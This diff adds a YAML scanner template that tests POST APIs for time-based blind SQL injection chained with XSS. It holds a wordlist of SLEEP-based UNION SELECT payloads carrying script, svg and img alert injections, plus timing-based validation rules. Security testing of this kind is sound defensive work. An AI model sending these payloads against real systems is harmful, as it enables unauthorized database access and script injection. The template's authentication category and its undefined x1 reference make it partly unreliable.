@@ -1,0 +1,145 @@
+id: TIME_BASED_SQLI_XSS_POST
+info:
+  name: "Time based SQL Injection Test with XSS for POST method APIs"
+  description: "The Time-Based SQL Injection Test with XSS for POST Method APIs combines two distinct attack vectors: SQL injection and Cross-Site Scripting (XSS). In this test, the attacker injects SQL payloads with time delays (e.g., using `sleep()` or `waitfor delay()`) into the POST method API inputs, allowing them to infer information about the database based on response times. Simultaneously, the injected payloads include XSS vectors, attempting to execute malicious scripts in the context of the user's browser. This test identifies vulnerabilities where both SQL and XSS attacks can be chained, potentially exposing sensitive data and enabling malicious script execution."
+  details: "The Time-Based SQL Injection Test with XSS for POST Method APIs targets applications that are vulnerable to blind SQL injection and Cross-Site Scripting (XSS) in API requests. By injecting time-based SQL queries, attackers can determine the presence of SQL injection flaws based on delays in the server's response. Additionally, the attack includes XSS payloads within the SQL injection, aiming to execute scripts in users' browsers when they interact with the API responses. This combination exploits both SQL injection and XSS vulnerabilities, potentially leading to unauthorized data access and malicious actions executed in user sessions."
+  impact: "The Time-Based SQL Injection Test with XSS for POST Method APIs can lead to severe security issues. The time-based SQL injection allows attackers to gather sensitive data or manipulate the database without directly seeing the results. Coupled with XSS, this attack can execute malicious scripts in users' browsers, enabling the theft of session cookies, defacement of web content, or spread of malware. In combination, these vulnerabilities compromise data integrity, user trust, and may result in unauthorized access, data leakage, or loss of sensitive information."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: TIME_BASED_SQLI_XSS_POST
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: SLOW
+
+
+api_selection_filters:
+  method:
+    eq: "POST"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+
+  request_payload:
+    for_one:
+      key:
+        regex: ".*"
+        extract: userKey
+      value:
+        extract: userVal
+wordLists:
+  timeBasedPayloads:
+    - "' AND IF(1=1, SLEEP(5), 0) UNION SELECT null,'<script>alert(\"XSS\");</script>' --"
+    - "' OR IF(1=1, SLEEP(5), 0) UNION SELECT null,concat('<svg/onload=alert(\"XSS\")>') --"
+    - "' AND IF(1=1, SLEEP(5), 0) UNION SELECT null,'<img src=\"x\" onerror=\"alert('XSS')\"> --"
+    - "' OR IF(1=1, SLEEP(5), 0) UNION SELECT null,concat('<script>alert(\"XSS\");</script>') --"
+    - "' AND IF(1=1, SLEEP(5), 0) UNION SELECT null,'<svg/onload=alert(\"XSS\")>' --"
+    - "' OR IF(1=1, SLEEP(5), 0) UNION SELECT null,concat('<img src=\"x\" onerror=\"alert('XSS')\">') --"
+execute:
+  type: multiple
+  requests:
+    - req:
+        - add_header:
+            dummyKey: dummyVal
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - Internal Server
+                - Failed
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid token
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+                - Attention Required!
+                - CloudFlare
+                - Sorry, you have been blocked
+                - " AND "
+                - " OR "
+        - success: x2
+        - failure: exit
+    - req:
+        - modify_body_param:
+            userKey: ${userVal}${timeBasedPayloads}
+        - validate:
+            response_code:
+              eq: 429
+validate:
+  and:
+    - compare_greater:
+        - ${x2.response.stats.median_response_time}
+        - 5001
+    - compare_greater:
+        - ${x2.response.stats.median_response_time}
+        - ${x1.response.stats.median_response_time} * 5
